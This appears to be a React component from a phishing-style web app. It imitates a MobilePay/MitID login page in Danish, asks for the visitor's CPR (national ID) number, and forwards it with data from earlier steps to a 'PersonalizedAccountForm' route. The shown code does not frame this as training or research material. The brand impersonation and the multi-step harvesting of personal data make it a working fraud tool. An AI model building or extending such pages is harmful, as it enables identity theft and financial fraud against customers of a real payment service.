import React, { useEffect,useState } from "react";
import { Form } from "react-bootstrap";
import { FaArrowRight } from "react-icons/fa";
import { AiOutlineInfoCircle } from "react-icons/ai";
import Loader from "./Loader";
import { Link,useNavigate, useLocation } from "react-router-dom";
import MitLogo from "./images/mit.png";
import MobilepayLogo from "./images/mobilePayLogo.png";

const validateInput = (value) => {
  if (value.length == 11 && 
    parseInt(value.substring(0,2)) > 0 && 
    parseInt(value.substring(0,2)) < 32 &&
    parseInt(value.substring(2,4)) > 0 && 
    parseInt(value.substring(2,4)) < 13) {
      return true
    }
  return false;
}

const FormFile = (props) => {
  const data = useLocation();
  //console.log(props)

  const [inputValue, setInputValue] = useState("");
  const [validInput, setValidInput] = useState("");
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  const handleInputChange = (event) => {
    setInputValue(event.target.value);
    console.log(event.target.value.substring(2,4))

    let cpr = document.getElementById("cpr");
    if(cpr.value.length === 6)
    {
      let updated = cpr.value + "-";
      cpr.value = updated;
    }

    //console.log(event.target.value)
    if (validateInput(event.target.value)) {
        setValidInput(true);
      }
    else {
      setValidInput(false);
    } 
  };
  const handleButtonClick = () => {
    const appendedData = {...data.state, CPR: inputValue}
    console.log(appendedData);
    navigate("/PersonalizedAccountForm", {state: appendedData});
  };

  useEffect(() => {
    setTimeout(() => {
      setLoading(false);
    }, 2);
  }, []);

  if (loading) return <Loader />;

  return (
    <div className="loginContainer">

      <div className="login_form">
      <img src={MobilepayLogo} alt="Logo" width="125px" height="23px" class="mobilepay_logo" />
        <div className="login_form_logo">
          <div>Log ind på MobilePay</div>
          <div>
            <img src={MitLogo} alt="Logo" width="80px" height="50px" />
          </div>
        </div>
        <div className="divider"></div>
        <div className="userid_form">
          <label>CPR NUMMER</label>
          <input 
          type="text" 
          onChange={handleInputChange}
          placeholder="DDMMÅÅ-XXXX" 
          id="cpr"
          />
        </div>
        <div className="btn_cont">
          <button
            className="button"

            onClick={handleButtonClick} disabled={!validInput}
          > 
            <span className="button-text">FORTSÆT</span>
            <FaArrowRight className="button-icon" />
          </button>
        </div>
        <div className="lost_user_id">
          <Link to="/lost-user-id" className="link">
            <div>
              <AiOutlineInfoCircle style={{ fontSize: "18px" }} />
            </div>
            <div
              style={{
                marginLeft: "5px",
                fontWeight: "600",
                marginBottom: "-3px",
              }}
            >
              Brug for hjælp?
            </div>
          </Link>
        </div>
        <Form.Check
          style={{ marginTop: "30px", marginBottom: "10px" }}
          type="checkbox"
          id="Husk mig på MitID.dk"
          label="Husk mig hos MobilePay"
        />

        <div className="divider"></div>
        <button className="cancel_btn">Afbryd</button>
        <button className="cancel_btn">Hjælp</button>
      </div>
    </div>
  );
};

export default FormFile;
